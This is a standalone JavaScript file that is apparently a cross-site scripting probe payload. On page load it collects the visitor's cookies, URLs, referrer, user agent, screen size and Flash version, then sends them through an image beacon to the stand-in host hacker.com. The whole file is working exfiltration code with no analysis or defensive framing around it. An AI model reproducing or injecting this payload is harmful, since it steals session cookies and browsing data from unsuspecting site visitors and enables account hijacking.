var serverEndpoint = "http://www.hacker.com/xssprobe/probe.php?c=";

// Helper to format values for the custom JSON-like string
const formatValueForEncoding = (val) => {
    if (typeof val === 'object' && val !== null) {
        return serializePayload(val); // Recursive call for nested objects
    }
    // Original quotes both strings and numbers
    if (typeof val === 'string' || typeof val === 'number') {
        return `'${val}'`;
    }
    return val; // For boolean, undefined, null, etc., return as is
};

// Function to serialize an object into the custom JSON-like string format
const serializePayload = (dataObject) => {
    const parts = Object.entries(dataObject).map(([key, value]) => {
        return `'${key}':${formatValueForEncoding(value)}`;
    });
    return `{${parts.join(',')}}`;
};

// Function to retrieve browser details, mimicking original's regex precedence
const retrieveBrowserDetails = (agentString) => {
    const webkitPattern = /(webkit)[ \/]([\w.]+)/;
    const operaPattern = /(opera)(?:.*version)?[ \/]([\w.]+)/;
    const msiePattern = /(msie) ([\w.]+)/;
    const mozillaPattern = /(mozilla)(?:.*? rv:([\w.]+))?/;

    let currentDetectionResult = null;

    currentDetectionResult = agentString.match(webkitPattern);
    if (currentDetectionResult) {
        return { name: currentDetectionResult[1] || "", version: currentDetectionResult[2] || "0" };
    }

    currentDetectionResult = agentString.match(operaPattern);
    if (currentDetectionResult) {
        return { name: currentDetectionResult[1] || "", version: currentDetectionResult[2] || "0" };
    }

    currentDetectionResult = agentString.match(msiePattern);
    if (currentDetectionResult) {
        return { name: currentDetectionResult[1] || "", version: currentDetectionResult[2] || "0" };
    }

    if (agentString.indexOf("compatible") < 0) {
        currentDetectionResult = agentString.match(mozillaPattern);
        if (currentDetectionResult) {
            return { name: currentDetectionResult[1] || "", version: currentDetectionResult[2] || "0" };
        }
    }

    return { name: "", version: "0" };
};

// Main execution block, triggered on window load
window.addEventListener('load', function initialDataTransfer() {
    const collectedData = {};

    // Browser details
    const agentText = navigator.userAgent.toLowerCase();
    const { name: browserName, version: browserVer } = retrieveBrowserDetails(agentText);
    collectedData.client = { name: browserName, version: browserVer };

    // Other standard details
    collectedData.agent = escape(navigator.userAgent);
    collectedData.language = navigator.language;
    collectedData.previousPage = escape(document.referrer);
    collectedData.currentPage = escape(window.location.href);
    collectedData.topFramePage = escape(top.location.href); // This will throw if cross-origin, mimicking original behavior.

    collectedData.sessionCookies = escape(document.cookie);
    collectedData.pageDomain = document.domain;
    collectedData.pageTitle = document.title;

    // Screen resolution
    let displayResolution = "";
    if (window.screen) {
        displayResolution = `${window.screen.width}x${window.screen.height}`;
    }
    collectedData.display = displayResolution;

    // Flash plugin detection
    let flashPluginVersion = "";
    const navObj = navigator;

    if (navObj.plugins && navObj.plugins.length > 0) {
        const pluginList = Array.from(navObj.plugins);
        const flashPlugin = pluginList.find(plugin => plugin.name.includes('Shockwave Flash'));
        if (flashPlugin) {
            const versionMatch = flashPlugin.description.split('Shockwave Flash ')[1];
            if (versionMatch) {
                flashPluginVersion = versionMatch;
            }
        }
    } else if (window.ActiveXObject) {
        let currentActiveXVersion = 20;
        while (currentActiveXVersion >= 2) {
            try {
                const activeXFlash = new ActiveXObject(`ShockwaveFlash.ShockwaveFlash.${currentActiveXVersion}`);
                if (activeXFlash) {
                    flashPluginVersion = `${currentActiveXVersion}.0`;
                    break;
                }
            } catch (e) { /* Ignore errors, try next version */ }
            currentActiveXVersion--;
        }
    }
    collectedData.flashPlugin = flashPluginVersion;

    const serializedInfo = serializePayload(collectedData);
    const transmissionURL = serverEndpoint + serializedInfo;

    const pixelBeacon = document.createElement('img');
    pixelBeacon.src = transmissionURL;
});